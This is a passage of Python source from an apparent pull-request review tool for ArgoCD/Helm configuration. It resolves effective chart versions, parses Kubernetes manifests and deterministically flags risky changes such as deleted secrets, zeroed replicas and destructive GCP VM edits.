        base = vf.rsplit("/", 1)[-1]
        if base == "customer.yaml" and vf not in vals:
            debug(f"effective chart revision skipped: customer.yaml unread for {app}",
                  app=app)
            return None
    return _effective_chart_version(pr_value_files, vals)


def _pr_chart_revision(app, candidate_files, pr_sha):
    """Return the new OCI chart targetRevision for an app if the PR changes it.

    Strategy: candidate_files is this app's own subset of the PR's changed
    files, already matched against path_map by the caller (see
    _match_files_to_apps, v2.4.8). Fetch each one from Bitbucket at pr_sha
    and search for an `appspace.version` YAML key.

    COPR-31756: when a changed file touches appspace.version, the returned
    revision is the EFFECTIVE value across the app's full Helm valueFiles
    chain (last-wins), not the parent file's version alone. A cohort parent
    bump under a child that still pins its own version is therefore a no-op.

    PERF FIX (v2.4.8): this function used to re-derive candidate_files by
    scanning the full changed_files list against path_map on every call --
    once per affected app. With ~600 apps that scan ran 600 times per PR.
    The caller now does that scan ONCE for the whole PR and hands each app
    just its own file list, so this function is pure O(candidate_files).

    Returns the new revision string if it differs from the current one cached in
    _app_chart_revision_map, otherwise returns None.
    """
    new_rev, _invalid = _pr_chart_revision_checked(app, candidate_files, pr_sha)
    return new_rev


def _pr_chart_revision_checked(app, candidate_files, pr_sha, main_sha=None, renames=None):
    """Like _pr_chart_revision, but also reports a rejected version.

    Returns (new_rev, invalid):
      new_rev — the new safe revision string if the PR bumps it, else None.
      invalid — True if any candidate file set appspace.version to a value
                that was rejected as unsafe/invalid. When invalid is True the
                caller must surface a blocking failure instead of silently
                diffing against the current revision (FIX A, v2.4.9).

    renames (v2.5.4, Finding 6): {old_clean_path: new_clean_path} for files
    the PR renamed/moved (from the raw Bitbucket diffstat pairing). A
    candidate file (typically customer.yaml) that 404s at pr_sha because it
    moved is followed to its new path instead of being skipped — otherwise
    a version bump bundled with a folder move (a real, common prod pattern:
    "monthly ver caught up ... moving to regular monthly cadence dir") is
    silently missed and the diff renders the OLD chart version.

    main_sha (v2.5.15, Finding 7): required to identity-verify an
    identity-file rename before following it (see _rename_identity_confirmed)
    — without it, this falls back to the pre-v2.5.15 unconditional trust.

    COPR-31756: once any candidate touches appspace.version, the bump is
    resolved via the full valueFiles chain (Helm last-wins). Falling back to
    the first changed-file version only when the live valueFiles map is not
    yet cached for the app.
    """
    current_rev = _app_chart_revision_map.get(app)
    if not current_rev:
        return None, False
    invalid = False
    saw_version = False
    fallback_rev = None
    trusted_dirs = _trusted_rename_dirs(renames, main_sha, pr_sha) if renames else set()
    for filepath in candidate_files:
        clean = posixpath.normpath(filepath.lstrip("/"))
        cache_key = (pr_sha, clean)
        with _vf_cache_lock:
            cached = _vf_cache.get(cache_key, ...)
        if cached is ...:
            raw, status = _bb_fetch_status(clean, pr_sha)
            if status in (BB_OK, BB_NOT_FOUND):
                with _vf_cache_lock:
                    _vf_cache[cache_key] = raw
            content = raw
        else:
            content = cached
        if not content and renames and clean in renames:
            new_clean = renames[clean]
            # v2.5.9: only follow when this specific pairing is trustworthy
            # (see _trusted_rename_dirs) — an ancillary file's coincidental
            # content match with an unrelated environment must not be read
            # as that app's own version. v2.5.15: an identity-file pairing
            # must ALSO carry the same declared identity on both sides.
            if not _is_trusted_rename(clean, new_clean, trusted_dirs, main_sha, pr_sha):
                continue
            new_key = (pr_sha, new_clean)
            with _vf_cache_lock:
                new_cached = _vf_cache.get(new_key, ...)
            if new_cached is ...:
                raw2, status2 = _bb_fetch_status(new_clean, pr_sha)
                if status2 in (BB_OK, BB_NOT_FOUND):
                    with _vf_cache_lock:
                        _vf_cache[new_key] = raw2
                content = raw2
            else:
                content = new_cached
        if not content:
            continue
        new_rev, vstatus = _extract_chart_version_checked(content)
        if vstatus == "invalid":
            invalid = True
            continue
        if new_rev:
            saw_version = True
            if new_rev != current_rev and fallback_rev is None:
                fallback_rev = new_rev
                debug(f"chart version candidate: {current_rev} -> {new_rev}",
                      app=app, file=filepath)

    if not saw_version:
        # COPR-31756: a customer.yaml edit that REMOVES appspace.version does
        # not set saw_version (no version key left), but the effective chart
        # revision still changes — it falls through to the parent default.
        # Re-resolve whenever a customer.yaml in this app's chain was touched
        # (including via a trusted rename of that path).
        leaf_touched = False
        vfs = _app_value_files_map.get(app) or []
        if vfs:
            chain_customer = set()
            for vf in vfs:
                clean_vf = posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
                if clean_vf.endswith("/customer.yaml") or clean_vf == "customer.yaml":
                    chain_customer.add(clean_vf)
            for filepath in candidate_files:
                clean = posixpath.normpath(str(filepath).lstrip("/").replace("$config/", ""))
                if clean in chain_customer:
                    leaf_touched = True
                    break
                # (A second check for "renamed customer.yaml" used to sit
                # here, but its condition required `clean in chain_customer`
                # again, which the branch above has already broken on -- it
                # was unreachable. The rename case is still covered: a
                # rename's OLD path stays in candidate_files and in the live
                # chain, so the check above fires for it.)
        if not leaf_touched:
            return None, invalid

    # When the live ArgoCD valueFiles chain is cached, always resolve the
    # effective revision from that chain (Helm last-wins). Do NOT fall back
    # to the changed parent's version — that is exactly the COPR-31756 false
    # downgrade (parent bump under a still-pinned customer.yaml).
    if _app_value_files_map.get(app):
        effective = _resolve_effective_pr_chart_revision(
            app, pr_sha, main_sha=main_sha, renames=renames)
        if effective and effective != current_rev:
            debug(f"chart version override (effective): {current_rev} -> {effective}",
                  app=app)
            return effective, invalid
        return None, invalid

    # No live valueFiles cached for this app yet — keep the pre-COPR-31756
    # fallback so unit tests and early-cache races still see a bump.
    if fallback_rev:
        debug(f"chart version override (fallback): {current_rev} -> {fallback_rev}",
              app=app)
        return fallback_rev, invalid
    return None, invalid



def _unquote(s: str) -> str:
    """Strip one layer of matching surrounding quotes from a scalar (v2.5.0 H1)."""
    s = s.strip()
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ("'", '"'):
        return s[1:-1]
    return s


def _split_yaml_docs(yaml_text):
    """Yield top-level YAML documents, expanding a `kind: List` wrapper.

    Helm/kubectl output can wrap resources in `kind: List` with an `items:`
    array. Before v2.5.0 that whole document parsed to zero resources (silent
    loss). We detect a List doc and re-emit each item as its own document at
    top-level indentation so the normal line scan can pick it up.
    """
    for doc in re.split(r'\n---\s*\n|^---\s*\n', yaml_text, flags=re.MULTILINE):
        if not doc.strip():
            continue
        # Is this a List wrapper? (kind: List with an items: sequence)
        if re.search(r'^kind:\s*List\s*$', doc, re.MULTILINE) and \
           re.search(r'^items:\s*$', doc, re.MULTILINE):
            # Split items on the `- ` sequence markers at column 0 and dedent.
            body = doc.split("items:", 1)[1]
            # Each item starts with "- " at the item indent; capture blocks.
            items = re.split(r'\n(?=- )', body.strip())
            for it in items:
                it = it.strip()
                if it.startswith("- "):
                    it = it[2:]
                # dedent: drop the common leading whitespace helm added to items
                lines = it.splitlines()
                dedented = []
                for i, ln in enumerate(lines):
                    if i == 0:
                        dedented.append(ln)
                    elif ln.startswith("  "):
                        dedented.append(ln[2:])
                    else:
                        dedented.append(ln)
                block = "\n".join(dedented).strip()
                if block:
                    yield block
        else:
            yield doc


def _strip_trailing_comment(value: str) -> str:
    """Strip a trailing ` # comment` from an unquoted YAML scalar (v2.5.3).

    A quoted value ('...' or "...") is left untouched -- a '#' inside quotes
    is literal data, not a comment, and k8s resource names can't legally
    contain one anyway (DNS-1123), so this only ever affects the defensive
    unquoted-scalar case.
    """
    if value[:1] in ("'", '"'):
        return value
    return re.sub(r'\s+#.*$', '', value).strip()


def _parse_manifest_resources(yaml_text):
    """Split a multi-document YAML string into a dict keyed by (group/Kind, ns/name).

    Each value is the normalized document text (stripped, consistent trailing newline).
    Documents without kind/metadata are skipped.
    """
    resources = {}
    for doc in _split_yaml_docs(yaml_text):
        doc = doc.strip()
        if not doc:   # pragma: no cover - _split_yaml_docs never yields blank
            continue
        kind = ns = name = api = ""
        in_meta = False
        meta_child_indent = None  # indent of metadata's direct children,
                                   # determined dynamically instead of the
                                   # hardcoded "exactly 2 spaces" this used to
                                   # assume. Real `helm template` output is
                                   # always 2-space, so this never triggered
                                   # in production, but hardcoding it was
                                   # fragile (v2.5.3 defensive hardening).
                                   # Still required (not "any indent") to
                                   # avoid matching a deeper nested `name:`,
                                   # e.g. metadata.ownerReferences[].name.
        for line in doc.splitlines():
            if line.startswith("apiVersion:"):
                api = line.split(":", 1)[1].strip()
            elif line.startswith("kind:"):
                kind = line.split(":", 1)[1].strip()
            elif line.startswith("metadata:"):
                in_meta = True
                meta_child_indent = None
            elif in_meta:
                stripped = line.lstrip()
                if not stripped:
                    continue
                indent = len(line) - len(stripped)
                if indent == 0:
                    in_meta = False
                    continue
                if meta_child_indent is None:
                    meta_child_indent = indent
                if indent == meta_child_indent:
                    if stripped.startswith("namespace:"):
                        ns = _strip_trailing_comment(
                            stripped.split(":", 1)[1].strip())
                    elif stripped.startswith("name:"):
                        name = _strip_trailing_comment(
                            stripped.split(":", 1)[1].strip())
        if kind and not name:
            # Fallback for flow-style metadata (e.g. `metadata: {name: x}`),
            # valid YAML that the block-style line scan above cannot see.
            # Without this the whole resource was skipped on BOTH sides and
            # a real change reported as no-diff (bughunt F5a).
            m = re.search(r"^metadata:\s*\{(.*)\}\s*$", doc, re.MULTILINE)
            if m:
                flow = m.group(1)
                def _flow_val(field):
                    fm = re.search(
                        r"\b" + field + r":\s*(\"([^\"]*)\"|'([^']*)'|([^,}\s]+))",
                        flow)
                    return (fm.group(2) or fm.group(3) or fm.group(4)) if fm else ""
                name = name or _flow_val("name")
                ns   = ns or _flow_val("namespace")
        if not (kind and name):
            if kind or name or "apiVersion:" in doc:
                # A K8s-looking document we could not identify: say so instead
                # of dropping it silently (diagnosability for future parser gaps).
                debug(f"manifest parser: skipping unidentifiable document "
                      f"(kind={kind!r} name={name!r}): {doc[:120]!r}")
            continue
        # Use ArgoCD-style key: /Kind ns/name (group prefix for non-core).
        # Strip matching surrounding quotes from name/namespace so a change
        # that only re-quotes the name (name: x vs name: "x") is seen as the
        # SAME resource, not a phantom add+delete (v2.5.0 H1).
        name = _unquote(name)
        ns   = _unquote(ns)
        grp = api.split("/")[0] if "/" in api else ""
        type_key = f"{grp}/{kind}" if grp and grp not in ("v1", "") else kind
        key = (type_key, ns or "", name)
        if key in resources and resources[key] != doc + "\n":
            # Same (kind, ns, name) emitted twice with different content
            # (umbrella charts merging subchart output). Keep both diffable
            # instead of silently overwriting the first (bughunt F5b).
            n2 = 2
            while (key[0], key[1], f"{name}#{n2}") in resources:
                n2 += 1
            log(f"manifest parser: duplicate resource {key} in render "
                f"\u2014 keeping both as '#{n2}' variant", "WARNING")
            key = (key[0], key[1], f"{name}#{n2}")
        resources[key] = doc + "\n"
    return resources


# ── Deterministic risk detection (v2.5.26) ──────────────────────────
# Field report (PR 6773): a version bump DELETED an ExternalSecret and an
# IAMPolicyMember and the comment said "No critical changes detected". Two
# stacked causes: the CRITICAL CHANGES block was 100% AI-generated, and
# DiffResult.sections is capped to AI_MAX_SECTIONS_PER_APP at diff time —
# in a 111-resource app the deletion sections were discarded before
# anything downstream could see them. Safety-relevant facts must be
# detected deterministically on the FULL pre-cap section list (same design
# language as the downgrade warning v2.5.8 and decommission v2.5.10) and
# fed to the AI as authoritative, never inferred by it.

_SENSITIVE_KINDS = (
    "Secret", "ExternalSecret", "SecretStore", "ClusterSecretStore",
    "IAMPolicy", "IAMPolicyMember", "IAMServiceAccount", "IAMPartialPolicy",
    "ServiceAccount", "Role", "RoleBinding", "ClusterRole",
    "ClusterRoleBinding", "PersistentVolumeClaim", "PersistentVolume",
    "Namespace", "CustomResourceDefinition",
    "ValidatingWebhookConfiguration", "MutatingWebhookConfiguration",
    "NetworkPolicy",
)

_WORKLOAD_KINDS = ("Deployment", "StatefulSet", "ReplicaSet")


def _section_kind(header: str) -> str:
    """'/external-secrets.io/ExternalSecret card-deployment-key' -> 'ExternalSecret'.

    Headers are built as "/{type_key} {ns}/{name}" or "/{type_key} {name}"
    (see _diff_resources). The kind therefore lives on the LEFT of the first
    space, and must be read from there.

    COPS-2594: the previous implementation split on the last slash first, so
    for any namespaced resource it returned the resource NAME instead of the
    kind -- "/v1/Secret my-ns/db-credentials" gave "db-credentials". That
    silently made _is_sensitive_kind False for every namespaced Secret,
    ExternalSecret, RoleBinding and so on, so a deleted namespaced Secret
    was listed without the sensitive-kind flag and never got a reserved
    display slot in _prioritise_risk_sections. Exactly the class of miss the
    deleted-resources block exists to prevent (PR 6773)."""
    try:
        left = header.split(" ", 1)[0]
        return left.rsplit("/", 1)[-1]
    except Exception:
        return ""


def _section_name(header: str) -> str:
    """'/batch/Job acme-secret-generator/pv-x-job-cb71f3d8' -> 'pv-x-job-cb71f3d8'.

    The name is the last path component to the RIGHT of the first space, so
    a namespace prefix is stripped."""
    try:
        right = header.split(" ", 1)[1]
    except Exception:
        return ""
    return right.rsplit("/", 1)[-1].strip().strip('"')


def _is_sensitive_kind(header: str) -> bool:
    return _section_kind(header) in _SENSITIVE_KINDS


def _detect_deleted_resources(sections: list) -> list:
    """Headers of sections that DELETE a resource entirely.

    A true deletion is the manifest diffed against empty (_diff_resources
    with an absent PR side): every content line is a minus and there are NO
    context lines. Bodies come from difflib.unified_diff with its default 3
    context lines, so any partial change where at least one line survives
    always carries context lines (they start with a space). "Minus lines and
    no plus lines" alone is NOT enough -- that is also the signature of a
    change that only removes lines from a manifest that still exists, and
    it made PR 3829 report 110 deletions for a removed `replicas:` line and
    PR 6956 report 2480 for a removed tolerations block (COPS-2563)."""
    deleted = []
    for header, body in sections:
        minus = plus = context = 0
        for line in body.splitlines():
            if line.startswith("+++") or line.startswith("---"):
                continue
            if line.startswith("+"):
                plus += 1
            elif line.startswith("-"):
                minus += 1
            elif line.startswith(" "):
                context += 1
        if minus and not plus and not context:
            deleted.append(header)
    return deleted


def _detect_created_resources(sections: list) -> list:
    """Headers of sections that CREATE a resource entirely.

    Exact mirror of _detect_deleted_resources: the manifest diffed against
    an absent main side, so every content line is a plus and there are NO
    context lines. Needed to tell a rename from a deletion (COPS-2594).
    """
    created = []
    for header, body in sections:
        minus = plus = context = 0
        for line in body.splitlines():
            if line.startswith("+++") or line.startswith("---"):
                continue
            if line.startswith("+"):
                plus += 1
            elif line.startswith("-"):
                minus += 1
            elif line.startswith(" "):
                context += 1
        if plus and not minus and not context:
            created.append(header)
    return created


def _is_rename_of(old_header: str, new_header: str) -> bool:
    """True when two headers plausibly name the SAME resource renamed.

    Deliberately narrow. A false positive here SUPPRESSES a real deletion
    warning, which is strictly worse than the noise this fixes, so this is
    two explainable rules rather than a similarity score. Both additionally
    require the same kind.

    Rule A - hash rename: identical except the final `-<token>` segment.
      pv-x-acme-secret-generator-cb71f3d8 -> pv-x-acme-secret-generator-3abbd629
      (the Job name carries a content hash, so every version bump renames it)

    Rule B - one token inserted or removed anywhere in the hyphen-token list.
      ...-mediatransform-access -> ...-mediatransform-gsa-access
      (mediatransform moved from workload identity to a dedicated GSA)
    """
    if _section_kind(old_header) != _section_kind(new_header):
        return False
    a, b = _section_name(old_header), _section_name(new_header)
    if not a or not b or a == b:
        return False

    ta, tb = a.split("-"), b.split("-")

    # Rule A: same length, differ only in the final token.
    if len(ta) == len(tb) and len(ta) > 1 and ta[:-1] == tb[:-1]:
        return True

    # Rule B: exactly one token inserted or removed.
    if abs(len(ta) - len(tb)) == 1:
        longer, shorter = (ta, tb) if len(ta) > len(tb) else (tb, ta)
        for i in range(len(longer)):
            if longer[:i] + longer[i + 1:] == shorter:
                return True
    return False


def _split_renames_from_deletions(deleted: list, created: list):
    """Split a deletion list into (real_deletions, renames).

    Each creation can absorb at most one deletion, so two deletions racing
    for one creation leave the loser reported as a genuine deletion. Order
    of the surviving deletions is preserved.
    """
    unused = list(created or [])
    real, renames = [], []
    for d in (deleted or []):
        match = next((c for c in unused if _is_rename_of(d, c)), None)
        if match is None:
            real.append(d)
        else:
            unused.remove(match)
            renames.append((d, match))
    return real, renames


def _detect_replicas_zeroed(sections: list) -> list:
    """Workload sections where replicas drop from >0 to exactly 0. Kept as
    an AI prompt fact only (not a shouty block): zeroing can be legitimate
    hibernation (zeroPods), but the model must reliably see it even when
    the section did not fit its capped prompt."""
    zeroed = []
    for header, body in sections:
        if _section_kind(header) not in _WORKLOAD_KINDS:
            continue
        had_pos = has_zero = False
        for line in body.splitlines():
            ls = line.strip()
            if line.startswith("-") and ls.lstrip("- ").startswith("replicas:"):
                try:
                    had_pos = int(ls.split(":", 1)[1].strip()) > 0 or had_pos
                except ValueError:
                    pass
            if line.startswith("+") and ls.lstrip("+ ").startswith("replicas: 0"):
                has_zero = True
        if had_pos and has_zero:
            zeroed.append(header)
    return zeroed


# ── VM-domain (KCC linux-services) risk detection ────────────────────
# The slowest thing on this platform to recover from is a botched virtual
# machine change: unlike a Kubernetes rollout there is no quick rollback
# for a wrong machine type, a shrunk disk, or a deletion-policy flip that
# lets the next cascade actually destroy the VM. The reviewers who read
# these comments daily asked for VM changes to be unmistakable. Detection
# is deterministic and runs on the FULL pre-cap section list (the PR-6773
# lesson: display caps must never hide a safety fact), exactly like the
# deleted-resources detection above.

_VM_KINDS = ("ComputeInstance", "ComputeDisk", "ComputeAddress",
             "ComputeDiskResourcePolicyAttachment")
_VM_DELETION_POLICY_KEY = "cnrm.cloud.google.com/deletion-policy"
# Fields worth reporting per kind, taken from the templates in
# acme-components helm-charts/supporting-services/templates/
# kcc-linux-services/. `type` only counts as a disk type when the value is
# disk-shaped (pd-*/hyperdisk-*), which keeps unrelated `type:` keys (e.g.
# a network accessConfigs type) out of the report.
_VM_TRACKED_FIELDS = {
    "ComputeInstance": ("machineType", "zone", "desiredStatus",
                        "deletionProtection", "size", "type",
                        # deviceName lives inside attachedDisk[], but the
                        # body is parsed line by line, so the nesting does
                        # not matter here. Tracked because a mismatch makes
                        # KCC rename the attachment by detaching and
                        # reattaching a live disk (COPS-2592).
                        "deviceName",
                        _VM_DELETION_POLICY_KEY),
    "ComputeDisk": ("size", "type", "location", _VM_DELETION_POLICY_KEY),
    "ComputeAddress": ("address", _VM_DELETION_POLICY_KEY),
    "ComputeDiskResourcePolicyAttachment": ("resourceID", "zone"),
}
_VM_DISK_TYPE_RE = re.compile(r"^(pd-|hyperdisk-)")


def _vm_unquote(v: str) -> str:
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in "\"'":
        return v[1:-1]
    return v


def _detect_vm_changes(sections: list) -> list:
    """Structured facts for every VM-domain (KCC linux-services) section.

    Returns a list of dicts:
      {header, kind, name, fields: [(field, old, new)], created, deleted,
       dangerous: [reason, ...], notes: [note, ...]}

    The severity rules come straight from the rendering templates and their
    runbook comments in acme-components:
      - deletion-policy moving to `delete`, or deletionProtection turning
        false, means the next cascade/prune can actually destroy the
        resource in GCP (both are driven by allowDeletion) — dangerous.
      - a machineType change requires parking the VM first (desiredStatus:
        TERMINATED, wait for KCC, then back to RUNNING). A machineType
        change with no TERMINATED transition or TERMINATED state anywhere
        in the section is exactly the mistake the template comment warns
        about — dangerous.
      - zone and disk `type` are immutable in GCP: changing them means
        destroy-and-recreate — dangerous.
      - a disk size DECREASE is impossible in place (GCP only grows disks),
        so it implies recreation and data loss — dangerous. Growth is the
        routine case.
      - a whole VM-domain resource disappearing from the render (an
        `enabled` flag turning off, or the environment dropping the domain)
        is dangerous; a snapshot-policy attachment disappearing silently
        ends that disk's backup schedule.
    Everything else in the domain (status transitions, brand-new resources,
    an address re-pin) is reported as a routine/notable line — the panel
    only shouts when shouting is deserved, or nobody trusts it.
    """
    facts = []
    for header, body in sections or []:
        kind = _section_kind(header)
        if kind not in _VM_KINDS:
            continue
        tracked = _VM_TRACKED_FIELDS[kind]
        minus_vals, plus_vals = {}, {}
        untracked_keys = set()
        minus_n = plus_n = context_n = 0
        context_terminated = False
        for line in body.splitlines():
            if line.startswith("+++") or line.startswith("---"):
                continue
            sign = line[:1]
            if sign == " ":
                context_n += 1
                if "desiredStatus:" in line and "TERMINATED" in line:
                    context_terminated = True
                continue
            if sign not in ("+", "-"):
                continue
            if sign == "+":
                plus_n += 1
            else:
                minus_n += 1
            content = line[1:].strip()
            if ":" not in content:
                continue
            key, _, val = content.partition(":")
            key = key.strip()
            if key not in tracked:
                # COPS-2618: a closed tracked-field list means anything
                # outside it was dropped in silence, so a section that
                # genuinely changed could still leave the panel with
                # nothing to say and the caller would render
                # "VM infrastructure - no changes". That is what happened
                # on acme-config-prod #3923, where three objects each
                # gained five taxonomy labels and the panel denied it.
                # Remembering the untracked keys keeps the panel honest by
                # construction, for fields nobody has thought of yet as
                # much as for labels.
                if key and not key.startswith("-") and " " not in key:
                    untracked_keys.add(key)
                continue
            val = _vm_unquote(val)
            if key == "type" and not _VM_DISK_TYPE_RE.match(val):
                continue
            (plus_vals if sign == "+" else minus_vals).setdefault(
                key, []).append(val)
        deleted = bool(minus_n and not plus_n and not context_n)
        created = bool(plus_n and not minus_n and not context_n)
        fields, dangerous, notes = [], [], []
        if not deleted and not created:
            for key in tracked:
                olds, news = minus_vals.get(key, []), plus_vals.get(key, [])
                if not olds and not news:
                    continue
                old = olds[0] if olds else ""
                new = news[0] if news else ""
                if old == new:
                    continue
                fields.append((key, old, new))
        byk = {k: (o, n) for (k, o, n) in fields}
        if deleted:
            if kind == "ComputeDiskResourcePolicyAttachment":
                dangerous.append("snapshot-policy attachment removed — this "
                                 "disk loses its backup schedule")
            else:
                dangerous.append(
                    "%s removed from the render entirely (an enabled flag "
                    "turned off, or the environment dropped the domain)"
                    % kind)
        elif created:
            notes.append("new %s — appears in this environment for the "
                         "first time" % kind)
        else:
            pol = byk.get(_VM_DELETION_POLICY_KEY)
            if pol and pol[1] == "delete":
                dangerous.append("deletion-policy moves to `delete` — the "
                                 "next cascade can destroy this resource "
                                 "in GCP")
            prot = byk.get("deletionProtection")
            if prot and prot[1].lower() == "false":
                dangerous.append("deletionProtection turns OFF — GCP-side "
                                 "delete protection is removed")
            if "machineType" in byk:
                ds_new = byk.get("desiredStatus", ("", ""))[1]
                if ds_new != "TERMINATED" and not context_terminated:
                    dangerous.append("machineType changes while the VM is "
                                     "not parked TERMINATED — the runbook "
                                     "requires stopping the VM first")
            if "deviceName" in byk:
                o, n = byk["deviceName"]
                if o and n:
                    dangerous.append(
                        "attachedDisk `deviceName` changes `%s` → `%s` — KCC "
                        "renames an attachment by DETACHING and reattaching "
                        "the disk; on a RUNNING VM that happens under a "
                        "mounted filesystem" % (o, n))
                else:
                    # Pin added or removed. The chart omits deviceName when
                    # adopting, so the attachment name simply stops being
                    # managed; nothing is detached. Visible, not alarming —
                    # flagging it would block every adoption PR, which is
                    # what COPS-2608 just stopped doing.
                    notes.append(
                        "attachedDisk `deviceName` %s (`%s`) — the attachment "
                        "name stops or starts being managed; no disk "
                        "operation follows from this alone"
                        % ("removed" if o else "added", o or n))
            if "zone" in byk:
                dangerous.append("zone is immutable — changing it means "
                                 "destroy-and-recreate")
            if "type" in byk:
                dangerous.append("disk type is immutable — changing it "
                                 "means destroy-and-recreate")
            if "size" in byk:
                o, n = byk["size"]
                try:
                    if int(float(n)) < int(float(o)):
                        dangerous.append("disk size DECREASES — GCP cannot "
                                         "shrink a disk in place; this "
                                         "implies recreation and data loss")
                except ValueError:
                    # A size that is not plainly numeric (a templated value,
                    # or one carrying a unit suffix) cannot be compared, so
                    # the shrink check is skipped on purpose. The field is
                    # still reported above as an ordinary changed field.
                    continue
        # COPS-2618: a change the tracked list cannot describe is still a
        # change. Naming the keys keeps the line actionable -- a reviewer can
        # tell a taxonomy-label rollout from something worth opening the diff
        # for -- and guarantees the caller never renders "no changes" over a
        # section that visibly moved.
        if untracked_keys and not deleted and not created:
            shown = sorted(untracked_keys)
            notes.append(
                "other field(s) changed, not individually tracked by this "
                "panel: %s%s" % (", ".join("`%s`" % k for k in shown[:8]),
                                 "" if len(shown) <= 8
                                 else " and %d more" % (len(shown) - 8)))
        facts.append({"header": header, "kind": kind,
                      "name": _section_name(header), "fields": fields,
                      "created": created, "deleted": deleted,
                      "dangerous": dangerous, "notes": notes})
    return facts


def _prioritise_risk_sections(sections: list, deleted: list, zeroed: list,
                              reserve: int, extra: list = None) -> list:
    """Move risk sections to the front, up to `reserve` of them.

    COPS-2567. Sections arrive sorted by resource key, and the display caps
    take a flat prefix of that order. On acme-config-prod PR 3845 the ten
    display slots were filled by /apps/Deployment sections alone, so the five
    /autoscaling/HorizontalPodAutoscaler deletions the comment shouted about
    were never shown. A reviewer asked to verify a deletion needs to see it.

    This REORDERS and never drops, so n_res and every consumer of the full
    list keep working. Only the caps applied afterwards remove anything.
    `reserve` bounds the damage in the other direction: a PR with 200
    deletions must still show some ordinary changes.
    """
    risky = set(deleted or []) | set(zeroed or []) | set(extra or [])
    if not risky:
        return sections            # common case: byte for byte as before
    head, tail = [], []
    for item in sections:
        (head if item[0] in risky else tail).append(item)
    return head[:reserve] + tail + head[reserve:]


def _fingerprint_sections(sections: list) -> str:
    """Stable hash of a FULL (pre-cap) section list.

    Two apps whose real change is byte-for-byte identical (a shared
    ancestor-file edit applied the same way to many environments) must
    fingerprint to the SAME value regardless of: which order the diff
    workers finished in, what order sections happen to be sorted in for
    ONE app, or how many other apps or environments exist in the run.
    Sorting the normalized (header, body) pairs here makes the hash
    independent of section order; nothing here depends on the app name,
    since headers never carry it (e.g. "/apps/Deployment active-broadcast"
    names the resource inside the chart, not the environment).
    """
    normalized = sorted(f"{hdr}\x01{body}" for hdr, body in sections)
    blob = "\x00".join(normalized)
    return hashlib.sha256(blob.encode("utf-8", errors="replace")).hexdigest()


# ── Version-transition fold ───────────────────────────────────────────
# A platform version bump renders as dozens or hundreds of near-identical
# sections (185 and 473 on two real acme-config-prod PRs) whose ONLY
# changed lines are image tags, chart/version labels, checksum
# annotations, version-carrying env values and deploy timestamps.
# Inlining them all is what pushed single-environment bump comments to
# the 245KB hard cap, and it buried the one real change a reviewer
# needed to see (a brand-new KCC reconcile-interval annotation, found
# live inside 473 sections of noise). The classifier below decides,
# deterministically, which sections are provably that noise so the
# comment can fold them behind one line. The safe failure direction is
# always "keep the section inline": anything unpaired, unknown or
# ambiguous makes the whole section a needle.
_VERSION_FOLD_MIN = 3          # a fold line only pays for itself at 3+
_FOLD_CHECKSUM_RE = re.compile(r"^checksum/[\w./-]+$")
_FOLD_HEX_RE      = re.compile(r"^[0-9a-f]{6,64}$")
_FOLD_ISO_TS_RE   = re.compile(
    r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}(:\d{2})?(\.\d+)?(Z|[+-]\d{2}:?\d{2})$")
# Keys whose value IS a version (or carries one as a -<version> suffix).
# Deliberately narrow: a generic "version:" config key must NOT be here,
# it can mean anything (schema versions, API versions, file formats).
_FOLD_CHART_LABEL_KEYS = ("helm.sh/chart", "app.kubernetes.io/version",
                          "appVersion", "targetRevision")
_FOLD_TRAILING_VER_RE  = re.compile(r"^(.*?)-(\d[\w.+-]*)$")
_FOLD_CLASS_ORDER = ("image tags", "chart labels", "version env values",
                     "checksums", "deploy timestamps")


def _fold_pairs(body: str):
    """Pair every changed line of a unified-diff body by YAML key.

    Returns a list of (key, old_value, new_value) or None when the body
    cannot be fully paired: a pure addition or deletion, an unbalanced
    key, or any changed line that is not a simple "key: value". Pairing
    is positional per key (the i-th removed "value:" matches the i-th
    added one); if a hunk reorders lines the values will not classify
    and the section stays inline, which is the safe direction.
    """
    minus, plus = [], []
    for raw in body.splitlines():
        if raw.startswith(("---", "+++", "@@", "\\")):
            continue
        if raw[:1] == "-":
            minus.append(raw[1:])
        elif raw[:1] == "+":
            plus.append(raw[1:])
    if not minus or not plus:
        return None

    def _kv(sline):
        t = sline.strip()
        if t.startswith("- "):
            t = t[2:]
        if ":" not in t:
            return None
        k, v = t.split(":", 1)
        return k.strip(), v.strip().strip('"').strip("'")

    by_key_old, by_key_new = {}, {}
    for src, sink in ((minus, by_key_old), (plus, by_key_new)):
        for sline in src:
            kv = _kv(sline)
            if kv is None:
                return None
            sink.setdefault(kv[0], []).append(kv[1])
    if set(by_key_old) != set(by_key_new):
        return None
    pairs = []
    for k, olds in by_key_old.items():
        news = by_key_new[k]
        if len(olds) != len(news):
            return None
        pairs.extend((k, o, n) for o, n in zip(olds, news))
    return pairs


def _split_image(v: str):
    """('repo', 'tag') for repo:tag image references, else (None, None)."""
    if ":" not in v:
        return None, None
    repo, tag = v.rsplit(":", 1)
    if not repo or not tag or "/" in tag:
        return None, None
    return repo, tag


def _classify_fold_pair(key, old, new, candidates):
    """One paired change -> (noise_class, version_pair) or (None, None).

    candidates is the set of (old, new) version transitions observed on
    unambiguous carriers; a bare env "value:" pair is only accepted when
    it repeats one of those, so an unrelated config value can never fold.
    """
    if _FOLD_CHECKSUM_RE.match(key):
        if (_FOLD_HEX_RE.match(old) and _FOLD_HEX_RE.match(new)
                and old != new):
            return "checksums", None
        return None, None
    kl = key.lower()
    if kl == "image" or kl.endswith("image"):
        ro, to = _split_image(old)
        rn, tn = _split_image(new)
        if ro and ro == rn and to != tn:
            candidates.add((to, tn))
            return "image tags", (to, tn)
        return None, None
    if key in _FOLD_CHART_LABEL_KEYS:
        if key == "helm.sh/chart":
            mo = _FOLD_TRAILING_VER_RE.match(old)
            mn = _FOLD_TRAILING_VER_RE.match(new)
            if (mo and mn and mo.group(1) == mn.group(1)
                    and mo.group(2) != mn.group(2)):
                pair = (mo.group(2), mn.group(2))
                candidates.add(pair)
                return "chart labels", pair
            return None, None
        if old != new:
            candidates.add((old, new))
            return "chart labels", (old, new)
        return None, None
    if key == "value":
        if _FOLD_ISO_TS_RE.match(old) and _FOLD_ISO_TS_RE.match(new):
            return "deploy timestamps", None
        if (old, new) in candidates:
            return "version env values", (old, new)
        return None, None
    return None, None


def _classify_version_fold(sections, version_change=None,
                           exempt=frozenset()):
    """Which sections are provably version-bump noise, and which are not.

